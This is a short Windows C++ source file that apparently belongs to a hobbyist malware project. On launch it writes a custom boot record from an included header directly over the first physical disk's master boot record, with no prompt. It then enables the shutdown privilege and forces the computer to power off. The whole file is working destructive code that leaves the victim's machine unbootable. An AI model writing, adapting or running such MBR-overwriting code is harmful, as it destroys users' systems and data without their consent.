#include <Windows.h>
#include "bootloader.hpp"

// Meh, lazy to modify the code to use NRHE. //
BOOL WINAPI ForceShutdownPC(VOID) {
	HANDLE hToken;
	TOKEN_PRIVILEGES tokenPrivileges;

	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tokenPrivileges.Privileges[0].Luid);
	tokenPrivileges.PrivilegeCount = 1;
	tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, 0, (PTOKEN_PRIVILEGES)NULL, NULL);
	ExitWindowsEx(EWX_POWEROFF | EWX_FORCE, NULL);
	return TRUE;
}

INT CALLBACK wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpwCmdLine, INT nCmdShow) {
	DWORD dwBytes;

	HANDLE hDisk = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	WriteFile(hDisk, cstMBRData, cstMBRLength, &dwBytes, NULL);
	CloseHandle(hDisk);

	Sleep(1000);

	ForceShutdownPC();
}